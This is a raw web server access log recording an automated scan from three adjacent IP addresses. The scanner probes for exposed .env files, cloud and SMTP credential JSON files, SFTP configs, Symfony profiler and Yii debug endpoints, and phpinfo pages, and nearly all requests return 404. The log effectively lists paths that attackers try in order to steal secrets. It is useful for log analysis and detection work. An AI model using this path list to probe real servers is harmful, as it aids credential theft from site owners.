2.57.169.216 - - [05/May/2024:19:58:01 +0000] "POST /application/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:01 +0000] "GET /.env.project%20 HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.216 - - [05/May/2024:19:58:02 +0000] "GET /application/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:02 +0000] "POST /application/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:03 +0000] "GET /.env.project%20 HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:03 +0000] "POST /.env.project%20 HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:03 +0000] "GET /.env.dist HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:03 +0000] "POST /.env.dist HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:58:05 +0000] "GET /back/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:05 +0000] "POST /back/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:06 +0000] "GET /.env.dist HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:07 +0000] "POST /.env.dist HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:58:08 +0000] "GET /back/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:09 +0000] "POST /back/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:58:09 +0000] "GET /core/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.217 - - [05/May/2024:19:58:09 +0000] "POST /core/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:11 +0000] "GET /docker/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:12 +0000] "POST /docker/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:14 +0000] "GET /docker/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.217 - - [05/May/2024:19:58:14 +0000] "POST /docker/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:14 +0000] "GET /fedex/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:58:15 +0000] "GET /fedex/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:16 +0000] "POST /fedex/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:16 +0000] "GET /__tests__/test-become/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:18 +0000] "POST /__tests__/test-become/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:18 +0000] "GET /local/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:19 +0000] "POST /local/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:19 +0000] "GET /rest/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:20 +0000] "GET /__tests__/test-become/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:20 +0000] "POST /rest/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:20 +0000] "POST /__tests__/test-become/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:20 +0000] "GET /shared/.env%20 HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:20 +0000] "GET /local/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:20 +0000] "POST /local/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:20 +0000] "POST /shared/.env%20 HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:58:21 +0000] "GET /rest/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:22 +0000] "GET /sources/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:58:22 +0000] "POST /rest/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.217 - - [05/May/2024:19:58:22 +0000] "POST /sources/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:22 +0000] "GET /shared/.env%20 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.217 - - [05/May/2024:19:58:23 +0000] "GET /enviroments/.env.production HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:23 +0000] "POST /shared/.env%20 HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:23 +0000] "POST /enviroments/.env.production HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.216 - - [05/May/2024:19:58:23 +0000] "GET /sources/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:23 +0000] "GET /enviroments/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:23 +0000] "POST /sources/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:23 +0000] "POST /enviroments/.env HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.217 - - [05/May/2024:19:58:24 +0000] "GET /enviroments/.env.production HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:24 +0000] "POST /enviroments/.env.production HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:24 +0000] "GET / HTTP/1.1" 200 322 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:24 +0000] "GET /enviroments/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:24 +0000] "POST / HTTP/1.1" 405 157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:58:24 +0000] "POST /enviroments/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:24 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:25 +0000] "GET / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.215 - - [05/May/2024:19:58:25 +0000] "POST / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.217 - - [05/May/2024:19:58:25 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.217 - - [05/May/2024:19:58:27 +0000] "GET /debug/default/view.html HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:27 +0000] "GET /debug/default/view.html HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:29 +0000] "GET /debug/default/view HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:30 +0000] "GET /debug/default/view HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:30 +0000] "GET /frontend/web/debug/default/view HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.217 - - [05/May/2024:19:58:30 +0000] "GET /frontend/web/debug/default/view HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:30 +0000] "GET /web/debug/default/view HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:30 +0000] "GET /sapi/debug/default/view HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.217 - - [05/May/2024:19:58:31 +0000] "GET /config.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:33 +0000] "GET /web/debug/default/view HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.217 - - [05/May/2024:19:58:33 +0000] "GET /sapi/debug/default/view HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:34 +0000] "GET /config.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:35 +0000] "GET /AwsConfig.json HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:36 +0000] "GET /awsconfig.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:36 +0000] "GET /awsconfig.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.217 - - [05/May/2024:19:58:36 +0000] "GET /aws.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:39 +0000] "GET /aws.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:40 +0000] "GET /conf.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:58:40 +0000] "GET /env.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.217 - - [05/May/2024:19:58:40 +0000] "GET /conf.json HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.217 - - [05/May/2024:19:58:40 +0000] "GET /env.json HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15" "-"
2.57.169.215 - - [05/May/2024:19:58:40 +0000] "GET /.vscode/sftp.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.217 - - [05/May/2024:19:58:41 +0000] "GET /.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:41 +0000] "GET /smtp.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:41 +0000] "GET /db.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.217 - - [05/May/2024:19:58:42 +0000] "GET /sendgrid.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:42 +0000] "GET /ws-config.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:42 +0000] "GET /_wpeprivate/config.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:43 +0000] "GET /deployment-config.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:44 +0000] "GET /sftp-config.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:44 +0000] "GET /db/robomongo.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:44 +0000] "GET /robomongo.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:45 +0000] "GET /client_secrets.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.215 - - [05/May/2024:19:58:45 +0000] "GET /user-config.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:46 +0000] "GET /.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:46 +0000] "GET /ssh-config.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:46 +0000] "GET /database-config.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.215 - - [05/May/2024:19:58:49 +0000] "GET /config/default.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:50 +0000] "GET /config/config.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:50 +0000] "GET /credentials/config.json HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:51 +0000] "GET / HTTP/1.1" 200 322 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15" "-"
2.57.169.216 - - [05/May/2024:19:58:51 +0000] "GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.216 - - [05/May/2024:19:58:52 +0000] "GET /_profiler/open?file=app/config/parameters.yml HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:52 +0000] "GET /app/config/parameters.yml HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:58:52 +0000] "GET /db.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:58:52 +0000] "GET /config/parameters.yml HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:58:53 +0000] "GET /parameters.yml HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:53 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:58:53 +0000] "GET /sendgrid.json HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.215 - - [05/May/2024:19:58:55 +0000] "GET /ws-config.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:55 +0000] "GET /_wpeprivate/config.json HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.215 - - [05/May/2024:19:58:58 +0000] "GET /deployment-config.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:58:59 +0000] "GET /phpinfo.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.217 - - [05/May/2024:19:58:59 +0000] "GET /info.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:59:00 +0000] "GET /sftp-config.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:59:00 +0000] "GET /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:59:01 +0000] "GET /?phpinfo=1 HTTP/1.1" 200 322 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:59:02 +0000] "GET /tool/view/phpinfo.view.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.215 - - [05/May/2024:19:59:03 +0000] "GET /phpinfo HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.215 - - [05/May/2024:19:59:03 +0000] "GET /symfony/public/_profiler/phpinfo HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:59:04 +0000] "GET /html/phpinfo.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:59:05 +0000] "GET /?phpinfo=-1 HTTP/1.1" 200 322 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
